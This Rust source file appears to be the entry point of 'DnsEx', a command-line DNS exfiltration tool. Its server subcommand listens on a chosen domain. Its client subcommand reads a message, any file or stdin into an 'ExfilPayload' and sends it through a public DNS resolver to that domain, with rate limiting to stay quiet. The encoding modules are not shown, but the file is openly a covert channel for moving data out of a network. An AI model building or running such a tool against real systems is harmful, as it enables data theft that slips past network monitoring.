use clap::{Parser, Subcommand};
use client::{Client, ClientConfig, ExfilPayload};
use error::DnsexError;
use server::Server;
use std::path::Path;
use tokio::fs;
use tokio::io::{self, AsyncReadExt};

mod client;
mod error;
mod handler;
mod server;

#[derive(Parser, Debug)]
#[command(author, version, about = "DnsEx - Created by coigner <coigner@tuta.com>", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Server {
        #[arg(short, long)]
        domain: String,

        #[arg(short, long, default_value = "0.0.0.0")]
        bind: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,
    },

    Client {
        #[arg(short, long)]
        domain: String,

        #[arg(long, default_value = "8.8.8.8")]
        resolver: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,

        #[arg()]
        message: Option<String>,

        #[arg(short, long)]
        file: Option<String>,

        #[arg(long, default_value_t = 100)]
        rate_limit: u64,
    },
}

#[tokio::main]
async fn main() -> Result<(), DnsexError> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Server { domain, bind, port } => {
            let server = Server::new(domain, bind, port);
            server.start().await?;
        }

        Commands::Client {
            domain,
            resolver,
            port,
            message,
            file,
            rate_limit,
        } => {
            let payload = if let Some(msg) = message {
                ExfilPayload {
                    filename: "message.txt".to_string(),
                    data: msg.into_bytes(),
                }
            } else if let Some(path) = file {
                let path = Path::new(&path);
                ExfilPayload {
                    filename: path.file_name().unwrap().to_string_lossy().to_string(),
                    data: fs::read(&path).await?,
                }
            } else {
                let mut buf = Vec::new();
                let mut stdin = io::stdin();
                stdin.read_to_end(&mut buf).await?;

                ExfilPayload {
                    filename: "stdin.bin".into(),
                    data: buf,
                }
            };

            let client_config = ClientConfig {
                domain,
                resolver_ip: resolver,
                port,
                rate_limit_ms: rate_limit,
            };

            let client = Client::new(client_config);
            let _ = client.send_payload(payload).await?;
        }
    };

    Ok(())
}
